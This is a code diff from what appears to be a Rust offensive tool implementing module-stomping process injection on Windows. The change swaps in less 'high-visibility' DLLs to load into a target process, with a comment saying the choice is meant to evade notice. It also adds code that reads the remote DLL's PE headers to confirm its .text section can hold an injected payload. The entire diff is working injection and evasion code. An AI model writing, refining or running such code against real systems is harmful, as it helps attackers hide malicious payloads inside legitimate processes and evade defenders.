@@ -225,15 +225,20 @@ impl Injector for ModuleStompInjector {
 
             // ── If no suitable DLL found, load one via LdrLoadDll ──────────
             if target_base == 0 {
-                // Hardcoded candidate list: DLLs commonly available on Windows
-                // with large .text sections that are safe to stomp.
+                // Dynamic fallback candidates for on-demand loading.  These avoid
+                // very common/high-visibility choices and are filtered at runtime
+                // by remote .text size before selection.
                 let candidates = [
-                    "msfte.dll",
-                    "mshtml.dll",
                     "msxml3.dll",
-                    "iertutil.dll",
-                    "clrjit.dll",
+                    "msfte.dll",
+                    "netprofm.dll",
+                    "devobj.dll",
+                    "cryptbase.dll",
+                    "dbgeng.dll",
+                    "wer.dll",
                 ];
+                const PREFERRED_TEXT_MIN: usize = 256 * 1024;
+                const PREFERRED_TEXT_MAX: usize = 2 * 1024 * 1024;
                 let mut loaded_ok = false;
 
                 for &candidate in &candidates {
@@ -441,12 +446,73 @@ impl Injector for ModuleStompInjector {
                                 nl,
                                 &mut bytes_read,
                             );
-                            let ns = String::from_utf16_lossy(&nw).to_lowercase();
-                            if ns.contains(&candidate.to_lowercase()) {
-                                target_dll_name = Some(candidate.to_string());
-                                target_base = db;
-                                loaded_ok = true;
-                                break;
+                            let module_name = String::from_utf16_lossy(&nw);
+                            if module_name
+                                .trim_end_matches('\0')
+                                .eq_ignore_ascii_case(candidate)
+                            {
+                                // Validate the newly loaded candidate by reading
+                                // its PE headers from the remote process and
+                                // verifying that .text can accommodate payload.
+                                let mut cand_dos: IMAGE_DOS_HEADER = std::mem::zeroed();
+                                if ReadProcessMemory(
+                                    h_proc,
+                                    db as _,
+                                    &mut cand_dos as *mut _ as _,
+                                    size_of::<IMAGE_DOS_HEADER>(),
+                                    &mut bytes_read,
+                                ) != 0
+                                    && cand_dos.e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE
+                                {
+                                    let cand_nt_addr = db + cand_dos.e_lfanew as usize;
+                                    let mut cand_nt: IMAGE_NT_HEADERS64 = std::mem::zeroed();
+                                    if ReadProcessMemory(
+                                        h_proc,
+                                        cand_nt_addr as _,
+                                        &mut cand_nt as *mut _ as _,
+                                        size_of::<IMAGE_NT_HEADERS64>(),
+                                        &mut bytes_read,
+                                    ) != 0
+                                    {
+                                        let cand_ns = cand_nt.FileHeader.NumberOfSections as usize;
+                                        let cand_sec_base = cand_nt_addr
+                                            + std::mem::offset_of!(IMAGE_NT_HEADERS64, OptionalHeader)
+                                            + cand_nt.FileHeader.SizeOfOptionalHeader as usize;
+                                        let mut cand_text_size = 0usize;
+
+                                        for si in 0..cand_ns {
+                                            let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
+                                            if ReadProcessMemory(
+                                                h_proc,
+                                                (cand_sec_base + si * size_of::<IMAGE_SECTION_HEADER>())
+                                                    as _,
+                                                &mut sec as *mut _ as _,
+                                                size_of::<IMAGE_SECTION_HEADER>(),
+                                                &mut bytes_read,
+                                            ) == 0
+                                            {
+                                                break;
+                                            }
+                                            if &sec.Name[..5] == b".text" {
+                                                cand_text_size = *sec.Misc.VirtualSize() as usize;
+                                                break;
+                                            }
+                                        }
+
+                                        let payload_fits = cand_text_size >= payload.len();
+                                        let in_preferred_band = cand_text_size >= PREFERRED_TEXT_MIN
+                                            && cand_text_size <= PREFERRED_TEXT_MAX;
+
+                                        if payload_fits
+                                            && (in_preferred_band || payload.len() > PREFERRED_TEXT_MAX)
+                                        {
+                                            target_dll_name = Some(candidate.to_string());
+                                            target_base = db;
+                                            loaded_ok = true;
+                                            break;
+                                        }
+                                    }
+                                }
                             }
                         }
                         let nxt =
